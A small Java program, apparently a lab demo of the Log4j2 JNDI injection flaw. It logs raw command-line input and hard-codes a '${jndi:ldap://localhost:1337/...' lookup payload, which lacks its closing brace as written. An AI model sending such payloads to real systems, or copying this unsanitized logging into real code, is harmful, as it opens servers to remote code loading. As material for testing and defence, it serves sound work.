import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger("App");

    public static void main(String[] args) {
        System.out.println("Hello World!");
        logger.info("Starting application");
        if (args.length > 0) {
            // Log user input
            logger.info("User input: " + args[0]);
        } else {
            logger.info("No user input provided");
        }
        // logger.info("got request from: {}", args[0]);
        logger.info("${jndi:ldap://localhost:1337/a"); // Log4j2 JNDI Injection

        // wait for 10 seconds
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }
}
